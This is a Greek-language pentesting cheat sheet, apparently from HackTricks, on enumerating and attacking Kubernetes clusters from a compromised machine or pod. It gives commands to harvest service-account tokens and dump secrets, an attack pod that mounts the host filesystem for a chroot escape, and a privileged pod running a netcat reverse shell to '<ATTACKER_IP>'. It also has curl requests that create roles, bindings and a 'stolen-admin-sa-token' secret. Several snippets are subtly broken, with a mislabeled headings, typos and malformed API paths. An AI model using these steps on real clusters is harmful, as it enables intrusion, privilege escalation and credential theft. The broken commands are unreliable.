# Kubernetes Enumeration

{{#include ../../banners/hacktricks-training.md}}

## Kubernetes Tokens

Αν έχετε παραβιάσει την πρόσβαση σε μια μηχανή, ο χρήστης μπορεί να έχει πρόσβαση σε κάποια πλατφόρμα Kubernetes. Το token βρίσκεται συνήθως σε ένα αρχείο που υποδεικνύεται από τη **μεταβλητή περιβάλλοντος `KUBECONFIG`** ή **μέσα στο `~/.kube`**.

Σε αυτόν τον φάκελο μπορεί να βρείτε αρχεία ρυθμίσεων με **tokens και ρυθμίσεις για σύνδεση με τον API server**. Σε αυτόν τον φάκελο μπορείτε επίσης να βρείτε έναν φάκελο cache με πληροφορίες που έχουν ανακτηθεί προηγουμένως.

Αν έχετε παραβιάσει ένα pod μέσα σε ένα περιβάλλον kubernetes, υπάρχουν άλλα μέρη όπου μπορείτε να βρείτε tokens και πληροφορίες σχετικά με το τρέχον K8 env:

### Service Account Tokens

Πριν συνεχίσετε, αν δεν ξέρετε τι είναι μια υπηρεσία στο Kubernetes, θα σας πρότεινα να **ακολουθήσετε αυτόν τον σύνδεσμο και να διαβάσετε τουλάχιστον τις πληροφορίες σχετικά με την αρχιτεκτονική του Kubernetes.**

Λαμβάνεται από την [τεκμηρίωση του Kubernetes](https://kubernetes.io/docs/tasks/configure-pod-container/configure-service-account/#use-the-default-service-account-to-access-the-api-server):

_“Όταν δημιουργείτε ένα pod, αν δεν καθορίσετε μια υπηρεσία, ανατίθεται αυτόματα η_ προεπιλεγμένη _υπηρεσία στην ίδια namespace.”_

**ServiceAccount** είναι ένα αντικείμενο που διαχειρίζεται το Kubernetes και χρησιμοποιείται για να παρέχει μια ταυτότητα για τις διαδικασίες που εκτελούνται σε ένα pod.\
Κάθε service account έχει ένα μυστικό σχετικό με αυτό και αυτό το μυστικό περιέχει ένα bearer token. Αυτό είναι ένα JSON Web Token (JWT), μια μέθοδος για την ασφαλή αναπαράσταση αξιώσεων μεταξύ δύο μερών.

Συνήθως **ένας** από τους καταλόγους:

- `/run/secrets/kubernetes.io/serviceaccount`
- `/var/run/secrets/kubernetes.io/serviceaccount`
- `/secrets/kubernetes.io/serviceaccount`

περιέχει τα αρχεία:

- **ca.crt**: Είναι το ca πιστοποιητικό για να ελέγχει τις επικοινωνίες του kubernetes
- **namespace**: Υποδεικνύει την τρέχουσα namespace
- **token**: Περιέχει το **service token** του τρέχοντος pod.

Τώρα που έχετε το token, μπορείτε να βρείτε τον API server μέσα στη μεταβλητή περιβάλλοντος **`KUBECONFIG`**. Για περισσότερες πληροφορίες εκτελέστε `(env | set) | grep -i "kuber|kube`**`"`**

Το service account token υπογράφεται από το κλειδί που βρίσκεται στο αρχείο **sa.key** και επικυρώνεται από το **sa.pub**.

Προεπιλεγμένη τοποθεσία στο **Kubernetes**:

- /etc/kubernetes/pki

Προεπιλεγμένη τοποθεσία στο **Minikube**:

- /var/lib/localkube/certs

### Hot Pods

_**Hot pods είναι**_ pods που περιέχουν ένα προνομιακό service account token. Ένα προνομιακό service account token είναι ένα token που έχει άδεια να εκτελεί προνομιακές εργασίες όπως η καταγραφή μυστικών, η δημιουργία pods, κ.λπ.

## RBAC

Αν δεν ξέρετε τι είναι το **RBAC**, **διαβάστε αυτή την ενότητα**.

## GUI Applications

- **k9s**: Μια GUI που καταγράφει ένα kubernetes cluster από το τερματικό. Ελέγξτε τις εντολές στο [https://k9scli.io/topics/commands/](https://k9scli.io/topics/commands/). Γράψτε `:namespace` και επιλέξτε όλα για να αναζητήσετε πόρους σε όλες τις namespaces.
- **k8slens**: Προσφέρει μερικές δωρεάν δοκιμαστικές ημέρες: [https://k8slens.dev/](https://k8slens.dev/)

## Enumeration CheatSheet

Για να καταγράψετε ένα περιβάλλον K8s χρειάζεστε μερικά από αυτά:

- Ένα **έγκυρο authentication token**. Στην προηγούμενη ενότητα είδαμε πού να αναζητήσετε ένα token χρήστη και ένα token service account.
- Η **διεύθυνση (**_**https://host:port**_**) του Kubernetes API**. Αυτό μπορεί συνήθως να βρεθεί στις μεταβλητές περιβάλλοντος και/ή στο αρχείο kube config.
- **Προαιρετικό**: Το **ca.crt για να επαληθεύσετε τον API server**. Αυτό μπορεί να βρεθεί στα ίδια μέρη όπου μπορεί να βρεθεί το token. Αυτό είναι χρήσιμο για να επαληθεύσετε το πιστοποιητικό του API server, αλλά χρησιμοποιώντας `--insecure-skip-tls-verify` με `kubectl` ή `-k` με `curl` δεν θα χρειαστείτε αυτό.

Με αυτές τις λεπτομέρειες μπορείτε να **καταγράψετε το kubernetes**. Αν ο **API** για κάποιο λόγο είναι **προσβάσιμος** μέσω του **Internet**, μπορείτε απλά να κατεβάσετε αυτές τις πληροφορίες και να καταγράψετε την πλατφόρμα από τη μηχανή σας.

Ωστόσο, συνήθως ο **API server είναι μέσα σε ένα εσωτερικό δίκτυο**, επομένως θα χρειαστεί να **δημιουργήσετε ένα τούνελ** μέσω της παραβιασμένης μηχανής για να έχετε πρόσβαση σε αυτό από τη μηχανή σας, ή μπορείτε να **ανεβάσετε το** [**kubectl**](https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/#install-kubectl-binary-with-curl-on-linux) δυαδικό αρχείο, ή να χρησιμοποιήσετε **`curl/wget/οτιδήποτε`** για να εκτελέσετε ωμές HTTP αιτήσεις στον API server.

### Differences between `list` and `get` verbs

Με **`get`** δικαιώματα μπορείτε να αποκτήσετε πληροφορίες συγκεκριμένων περιουσιακών στοιχείων (_`describe` επιλογή στο `kubectl`_) API:
```
GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
```
Αν έχετε την άδεια **`list`**, επιτρέπεται να εκτελείτε API αιτήματα για να καταγράφετε έναν τύπο περιουσιακού στοιχείου (_`get` επιλογή στο `kubectl`_):
```bash
#In a namespace
GET /apis/apps/v1/namespaces/{namespace}/deployments
#In all namespaces
GET /apis/apps/v1/deployments
```
Αν έχετε την άδεια **`watch`**, επιτρέπεται να εκτελείτε API αιτήματα για να παρακολουθείτε τα περιουσιακά στοιχεία:
```
GET /apis/apps/v1/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments?watch=true
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments/{name}  [DEPRECATED]
GET /apis/apps/v1/watch/namespaces/{namespace}/deployments  [DEPRECATED]
GET /apis/apps/v1/watch/deployments  [DEPRECATED]
```
Ανοίγουν μια ροή σύνδεσης που σας επιστρέφει το πλήρες μανιφέστο μιας Ανάθεσης όποτε αλλάζει (ή όταν δημιουργείται μια νέα).

> [!CAUTION]
> Οι παρακάτω εντολές `kubectl` υποδεικνύουν απλώς πώς να καταγράψετε τα αντικείμενα. Εάν θέλετε να αποκτήσετε πρόσβαση στα δεδομένα, πρέπει να χρησιμοποιήσετε το `describe` αντί για το `get`

### Χρησιμοποιώντας curl

Από μέσα σε ένα pod μπορείτε να χρησιμοποιήσετε αρκετές μεταβλητές περιβάλλοντος:
```bash
export APISERVER=${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT_HTTPS}
export SERVICEACCOUNT=/var/run/secrets/kubernetes.io/serviceaccount
export NAMESPACE=$(cat ${SERVICEACCOUNT}/namespace)
export TOKEN=$(cat ${SERVICEACCOUNT}/token)
export CACERT=${SERVICEACCOUNT}/ca.crt
alias kurl="curl --cacert ${CACERT} --header \"Authorization: Bearer ${TOKEN}\""
# if kurl is still got cert Error, using -k option to solve this.
```
> [!WARNING]
> Από προεπιλογή, το pod μπορεί να **πρόσβαση** στον **kube-api server** στο όνομα τομέα **`kubernetes.default.svc`** και μπορείτε να δείτε το kube network στο **`/etc/resolv.config`** καθώς εδώ θα βρείτε τη διεύθυνση του DNS server του kubernetes (το ".1" της ίδιας σειράς είναι το kube-api endpoint).

### Χρησιμοποιώντας το kubectl

Έχοντας το token και τη διεύθυνση του API server, χρησιμοποιείτε το kubectl ή το curl για να αποκτήσετε πρόσβαση σε αυτό όπως υποδεικνύεται εδώ:

Από προεπιλογή, ο APISERVER επικοινωνεί με το σχήμα `https://`
```bash
alias k='kubectl --token=$TOKEN --server=https://$APISERVER --insecure-skip-tls-verify=true [--all-namespaces]' # Use --all-namespaces to always search in all namespaces
```
> αν δεν υπάρχει `https://` στη διεύθυνση URL, μπορεί να λάβετε σφάλμα όπως Bad Request.

Μπορείτε να βρείτε ένα [**επίσημο cheatsheet kubectl εδώ**](https://kubernetes.io/docs/reference/kubectl/cheatsheet/). Ο στόχος των επόμενων τμημάτων είναι να παρουσιαστούν με οργανωμένο τρόπο διάφορες επιλογές για να καταγράψετε και να κατανοήσετε το νέο K8s που έχετε αποκτήσει πρόσβαση.

Για να βρείτε το HTTP αίτημα που στέλνει το `kubectl`, μπορείτε να χρησιμοποιήσετε την παράμετρο `-v=8`

#### MitM kubectl - Proxyfying kubectl
```bash
# Launch burp
# Set proxy
export HTTP_PROXY=http://localhost:8080
export HTTPS_PROXY=http://localhost:8080
# Launch kubectl
kubectl get namespace --insecure-skip-tls-verify=true
```
### Τρέχουσα Διαμόρφωση

{{#tabs }}
{{#tab name="Kubectl" }}
```bash
kubectl config get-users
kubectl config get-contexts
kubectl config get-clusters
kubectl config current-context

# Change namespace
kubectl config set-context --current --namespace=<namespace>
```
{{#endtab }}
{{#endtabs }}

Αν καταφέρατε να κλέψετε τα διαπιστευτήρια κάποιων χρηστών, μπορείτε να **τα ρυθμίσετε τοπικά** χρησιμοποιώντας κάτι όπως:
```bash
kubectl config set-credentials USER_NAME \
--auth-provider=oidc \
--auth-provider-arg=idp-issuer-url=( issuer url ) \
--auth-provider-arg=client-id=( your client id ) \
--auth-provider-arg=client-secret=( your client secret ) \
--auth-provider-arg=refresh-token=( your refresh token ) \
--auth-provider-arg=idp-certificate-authority=( path to your ca certificate ) \
--auth-provider-arg=id-token=( your id_token )
```
### Λάβετε Υποστηριζόμενους Πόρους

Με αυτές τις πληροφορίες θα γνωρίζετε όλες τις υπηρεσίες που μπορείτε να καταγράψετε

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k api-resources --namespaced=true #Resources specific to a namespace
k api-resources --namespaced=false #Resources NOT specific to a namespace
```
{{#endtab }}
{{#endtabs }}

### Λάβετε Τρέχουσες Προνομίες

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k auth can-i --list #Get privileges in general
k auth can-i --list -n custnamespace #Get privileves in custnamespace

# Get service account permissions
k auth can-i --list --as=system:serviceaccount:<namespace>:<sa_name> -n <namespace>
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -i -s -k -X $'POST' \
-H $'Content-Type: application/json' \
--data-binary $'{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"metadata\":{\"creationTimestamp\":null},\"spec\":{\"namespace\":\"default\"},\"status\":{\"resourceRules\":null,\"nonResourceRules\":null,\"incomplete\":false}}\x0a' \
"https://$APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews"
```
{{#endtab }}
{{#endtabs }}

Ένας άλλος τρόπος για να ελέγξετε τα δικαιώματά σας είναι να χρησιμοποιήσετε το εργαλείο: [**https://github.com/corneliusweig/rakkess**](https://github.com/corneliusweig/rakkess)\*\*\*\*

Μπορείτε να μάθετε περισσότερα για το **Kubernetes RBAC** στο:

{{#ref}}
kubernetes-role-based-access-control-rbac.md
{{#endref}}

**Μόλις γνωρίζετε ποια δικαιώματα** έχετε, ελέγξτε την παρακάτω σελίδα για να καταλάβετε **αν μπορείτε να τα εκμεταλλευτείτε** για να κλιμακώσετε τα δικαιώματα:

{{#ref}}
abusing-roles-clusterroles-in-kubernetes/
{{#endref}}

### Λάβετε ρόλους άλλων

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get roles
k get clusterroles
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/roles?limit=500"
kurl -k -v "https://$APISERVER/apis/authorization.k8s.io/v1/namespaces/eevee/clusterroles?limit=500"
```
{{#endtab }}
{{#endtabs }}

### Λάβετε namespaces

Το Kubernetes υποστηρίζει **πολλαπλούς εικονικούς κλάδους** που υποστηρίζονται από τον ίδιο φυσικό κλάδο. Αυτοί οι εικονικοί κλάδοι ονομάζονται **namespaces**.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get namespaces
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/
```
{{#endtab }}
{{#endtabs }}

### Λάβετε μυστικά

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get secrets -o yaml
k get secrets -o yaml -n custnamespace
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/secrets/

kurl -v https://$APISERVER/api/v1/namespaces/custnamespace/secrets/
```
{{#endtab }}
{{#endtabs }}

Αν μπορείτε να διαβάσετε μυστικά, μπορείτε να χρησιμοποιήσετε τις παρακάτω γραμμές για να αποκτήσετε τα δικαιώματα που σχετίζονται με κάθε token:
```bash
for token in `k describe secrets -n kube-system | grep "token:" | cut -d " " -f 7`; do echo $token; k --token $token auth can-i --list; echo; done
```
### Λάβετε Λογαριασμούς Υπηρεσιών

Όπως συζητήθηκε στην αρχή αυτής της σελίδας **όταν εκτελείται ένα pod, συνήθως ανατίθεται ένας λογαριασμός υπηρεσίας σε αυτό**. Επομένως, η καταγραφή των λογαριασμών υπηρεσιών, των δικαιωμάτων τους και πού εκτελούνται μπορεί να επιτρέψει σε έναν χρήστη να κλιμακώσει τα δικαιώματα.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get serviceaccounts
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -k -v https://$APISERVER/api/v1/namespaces/{namespace}/serviceaccounts
```
{{#endtab }}
{{#endtabs }}

### Λάβετε Αναπτύξεις

Οι αναπτύξεις καθορίζουν τα **συστατικά** που πρέπει να **εκτελούνται**.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get deployments
k get deployments -n custnamespace
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/deployments/
```
{{#endtab }}
{{#endtabs }}

### Λάβετε Pods

Τα Pods είναι τα πραγματικά **δοχεία** που θα **τρέξουν**.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get pods
k get pods -n custnamespace
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/<namespace>/pods/
```
{{#endtab }}
{{#endtabs }}

### Λάβετε Υπηρεσίες

Kubernetes **υπηρεσίες** χρησιμοποιούνται για να **εκθέσουν μια υπηρεσία σε μια συγκεκριμένη θύρα και IP** (η οποία θα λειτουργεί ως φορτωτής για τα pods που προσφέρουν πραγματικά την υπηρεσία). Αυτό είναι ενδιαφέρον για να γνωρίζετε πού μπορείτε να βρείτε άλλες υπηρεσίες για να προσπαθήσετε να επιτεθείτε.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get services
k get services -n custnamespace
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/default/services/
```
{{#endtab }}
{{#endtabs }}

### Λάβετε κόμβους

Λάβετε όλους τους **κόμβους που είναι διαμορφωμένοι μέσα στο cluster**.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get nodes
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/nodes/
```
{{#endtab }}
{{#endtabs }}

### Λάβετε DaemonSets

**DaeamonSets** επιτρέπει να διασφαλιστεί ότι ένα **συγκεκριμένο pod εκτελείται σε όλους τους κόμβους** του cluster (ή στους επιλεγμένους). Εάν διαγράψετε το DaemonSet, τα pods που διαχειρίζεται θα διαγραφούν επίσης.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get daemonsets
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/apis/extensions/v1beta1/namespaces/default/daemonsets
```
{{#endtab }}
{{#endtabs }}

### Λάβετε cronjob

Τα cron jobs επιτρέπουν τον προγραμματισμό της εκκίνησης ενός pod που θα εκτελέσει κάποια ενέργεια, χρησιμοποιώντας σύνταξη παρόμοια με αυτή του crontab.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get cronjobs
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/apis/batch/v1beta1/namespaces/<namespace>/cronjobs
```
{{#endtab }}
{{#endtabs }}

### Λάβετε το configMap

Το configMap περιέχει πάντα πολλές πληροφορίες και αρχεία ρυθμίσεων που παρέχονται σε εφαρμογές που εκτελούνται στο kubernetes. Συνήθως μπορείτε να βρείτε πολλούς κωδικούς πρόσβασης, μυστικά, tokens που χρησιμοποιούνται για τη σύνδεση και την επικύρωση σε άλλες εσωτερικές/εξωτερικές υπηρεσίες.

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get configmaps # -n namespace
```
{{#endtab }}

{{#tab name="API" }}
```bash
kurl -v https://$APISERVER/api/v1/namespaces/${NAMESPACE}/configmaps
```
{{#endtab }}
{{#endtabs }}

### Λάβετε Πολιτικές Δικτύου / Πολιτικές Δικτύου Cilium

{{#tabs }}
{{#tab name="Πρώτη Καρτέλα" }}
```bash
k get networkpolicies
k get CiliumNetworkPolicies
k get CiliumClusterwideNetworkPolicies
```
{{#endtab }}
{{#endtabs }}

### Πάρε τα Πάντα / Όλα

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get all
```
{{#endtab }}
{{#endtabs }}

### **Λάβετε όλους τους πόρους που διαχειρίζεται το helm**

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k get all --all-namespaces -l='app.kubernetes.io/managed-by=Helm'
```
{{#endtab }}
{{#endtabs }}

### **Λάβετε τις καταναλώσεις Pods**

{{#tabs }}
{{#tab name="kubectl" }}
```bash
k top pod --all-namespaces
```
{{#endtab }}
{{#endtabs }}

## Αλληλεπίδραση με το cluster χωρίς τη χρήση του kubectl

Βλέποντας ότι το Kubernetes control plane εκθέτει ένα REST-ful API, μπορείτε να δημιουργήσετε χειροκίνητα HTTP αιτήματα και να τα στείλετε με άλλα εργαλεία, όπως το **curl** ή το **wget**.

### Διαφυγή από το pod

Εάν μπορείτε να δημιουργήσετε νέα pods, μπορεί να είστε σε θέση να διαφύγετε από αυτά στο node. Για να το κάνετε αυτό, πρέπει να δημιουργήσετε ένα νέο pod χρησιμοποιώντας ένα αρχείο yaml, να μεταβείτε στο δημιουργηθέν pod και στη συνέχεια να κάνετε chroot στο σύστημα του node. Μπορείτε να χρησιμοποιήσετε ήδη υπάρχοντα pods ως αναφορά για το αρχείο yaml, καθώς εμφανίζουν υπάρχουσες εικόνες και διαδρομές.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> αν χρειάζεστε να δημιουργήσετε pod σε συγκεκριμένο κόμβο, μπορείτε να χρησιμοποιήσετε την παρακάτω εντολή για να αποκτήσετε ετικέτες στον κόμβο
>
> `k get nodes --show-labels`
>
> Συνήθως, οι kubernetes.io/hostname και node-role.kubernetes.io/master είναι καλές ετικέτες για επιλογή.

Τότε δημιουργείτε το αρχείο attack.yaml σας
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
Μετά από αυτό δημιουργείτε το pod
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Τώρα μπορείτε να μεταβείτε στο δημιουργημένο pod ως εξής
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
Και τελικά κάνετε chroot στο σύστημα του κόμβου
```bash
chroot /root /bin/bash
```
Πληροφορίες που αποκτήθηκαν από: [Kubernetes Namespace Breakout using Insecure Host Path Volume — Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube – Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

### Δημιουργία ενός προνομιακού pod

Το αντίστοιχο αρχείο yaml είναι ως εξής:
```yaml
apiVersion: v1
kind: Pod
metadata:
name: everything-allowed-exec-pod
labels:
app: pentest
spec:
hostNetwork: true
hostPID: true
hostIPC: true
containers:
- name: everything-allowed-pod
image: alpine
securityContext:
privileged: true
volumeMounts:
- mountPath: /host
name: noderoot
command: [ "/bin/sh", "-c", "--" ]
args: [ "nc <ATTACKER_IP> <ATTACKER_PORT> -e sh" ]
#nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
volumes:
- name: noderoot
hostPath:
path: /
```
Δημιουργήστε το pod με curl:
```bash
CONTROL_PLANE_HOST=""
TOKEN=""

curl --path-as-is -i -s -k -X $'POST' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Content-Length: 478' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"labels\":{\"app\":\"pentest\"},\"name\":\"everything-allowed-exec-pod\",\"namespace\":\"default\"},\"spec\":{\"containers\":[{\"args\":[\"nc <ATTACKER_IP> <ATTACKER_PORT> -e sh\"],\"command\":[\"/bin/sh\",\"-c\",\"--\"],\"image\":\"alpine\",\"name\":\"everything-allowed-pod\",\"securityContext\":{\"privileged\":true},\"volumeMounts\":[{\"mountPath\":\"/host\",\"name\":\"noderoot\"}]}],\"hostIPC\":true,\"hostNetwork\":true,\"hostPID\":true,\"volumes\":[{\"hostPath\":{\"path\":\"/\"},\"name\":\"noderoot\"}]}}\x0a' \
"https://$CONTROL_PLANE_HOST/api/v1/namespaces/default/pods?fieldManager=kubectl-client-side-apply&fieldValidation=Strict"
```
### Διαγραφή ενός pod

Διαγράψτε ένα pod με curl:
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
POD_NAME="everything-allowed-exec-pod"

curl --path-as-is -i -s -k -X $'DELETE' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'Content-Length: 35' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"propagationPolicy\":\"Background\"}\x0a' \
"https://$CONTROL_PLANE_HOST/api/v1/namespaces/default/pods/$POD_NAME"
```
### Δημιουργία Λογαριασμού Υπηρεσίας
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"


curl --path-as-is -i -s -k -X $'POST' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'Content-Type: application/json' \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Accept: application/json' \
-H $'Content-Length: 109' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"apiVersion\":\"v1\",\"kind\":\"ServiceAccount\",\"metadata\":{\"name\":\"secrets-manager-sa-2\",\"namespace\":\"default\"}}\x0a' \
"https://$CONTROL_PLANE_HOST/api/v1/namespaces/$NAMESPACE/serviceaccounts?fieldManager=kubectl-client-side-apply&fieldValidation=Strict"
```
### Διαγραφή ενός Λογαριασμού Υπηρεσίας
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
SA_NAME=""
NAMESPACE="default"

curl --path-as-is -i -s -k -X $'DELETE' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Content-Length: 35' -H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"propagationPolicy\":\"Background\"}\x0a' \
"https://$CONTROL_PLANE_HOST/api/v1/namespaces/$NAMESPACE/serviceaccounts/$SA_NAME"
```
### Δημιουργία Ρόλου
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"


curl --path-as-is -i -s -k -X $'POST' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'Content-Type: application/json' \
-H $'Accept: application/json' \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Content-Length: 203' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"apiVersion\":\"rbac.authorization.k8s.io/v1\",\"kind\":\"Role\",\"metadata\":{\"name\":\"secrets-manager-role\",\"namespace\":\"default\"},\"rules\":[{\"apiGroups\":[\"\"],\"resources\":[\"secrets\"],\"verbs\":[\"get\",\"create\"]}]}\x0a' \
"https://$CONTROL_PLANE_HOST/apis/rbac.authorization.k8s.io/v1/namespaces/$NAMESPACE/roles?fieldManager=kubectl-client-side-apply&fieldValidation=Strict"
```
### Διαγραφή ενός Ρόλου
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"
ROLE_NAME=""

curl --path-as-is -i -s -k -X $'DELETE' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'Content-Length: 35' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"propagationPolicy\":\"Background\"}\x0a' \
"https://$$CONTROL_PLANE_HOST/apis/rbac.authorization.k8s.io/v1/namespaces/$NAMESPACE/roles/$ROLE_NAME"
```
### Δημιουργία Δέσμευσης Ρόλου
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"

curl --path-as-is -i -s -k -X $'POST' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Content-Length: 816' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"apiVersion\":\"rbac.authorization.k8s.io/v1\",\"kind\":\"RoleBinding\",\"metadata\":{\"name\":\"secrets-manager-role-binding\",\"namespace\":\"default\"},\"roleRef\":{\"apiGroup\":\"rbac.authorization.k8s.io\",\"kind\":\"Role\",\"name\":\"secrets-manager-role\"},\"subjects\":[{\"apiGroup\":\"\",\"kind\":\"ServiceAccount\",\"name\":\"secrets-manager-sa\",\"namespace\":\"default\"}]}\x0a' \
"https://$CONTROL_PLANE_HOST/apis/rbac.authorization.k8s.io/v1/$NAMESPACE/default/rolebindings?fieldManager=kubectl-client-side-apply&fieldValidation=Strict"
```
### Διαγραφή ενός Role Binding
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"
ROLE_BINDING_NAME=""

curl --path-as-is -i -s -k -X $'DELETE' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'Content-Length: 35' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"propagationPolicy\":\"Background\"}\x0a' \
"https://$CONTROL_PLANE_HOST/apis/rbac.authorization.k8s.io/v1/namespaces/$NAMESPACE/rolebindings/$ROLE_BINDING_NAME"
```
### Διαγραφή ενός Μυστικού
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"

curl --path-as-is -i -s -k -X $'POST' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Accept: application/json' \
-H $'Content-Type: application/json' \
-H $'Content-Length: 219' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"apiVersion\":\"v1\",\"kind\":\"Secret\",\"metadata\":{\"annotations\":{\"kubernetes.io/service-account.name\":\"cluster-admin-sa\"},\"name\":\"stolen-admin-sa-token\",\"namespace\":\"default\"},\"type\":\"kubernetes.io/service-account-token\"}\x0a' \
"https://$CONTROL_PLANE_HOST/api/v1/$NAMESPACE/default/secrets?fieldManager=kubectl-client-side-apply&fieldValidation=Strict"
```
### Διαγραφή ενός Μυστικού
```bash
CONTROL_PLANE_HOST=""
TOKEN=""
NAMESPACE="default"
SECRET_NAME=""

ccurl --path-as-is -i -s -k -X $'DELETE' \
-H "Host: $CONTROL_PLANE_HOST" \
-H "Authorization: Bearer $TOKEN" \
-H $'Content-Type: application/json' \
-H $'Accept: application/json' \
-H $'User-Agent: kubectl/v1.32.0 (linux/amd64) kubernetes/70d3cc9' \
-H $'Content-Length: 35' \
-H $'Accept-Encoding: gzip, deflate, br' \
--data-binary $'{\"propagationPolicy\":\"Background\"}\x0a' \
"https://$CONTROL_PLANE_HOST/api/v1/namespaces/$NAMESPACE/secrets/$SECRET_NAME"
```
## Αναφορές

{{#ref}}
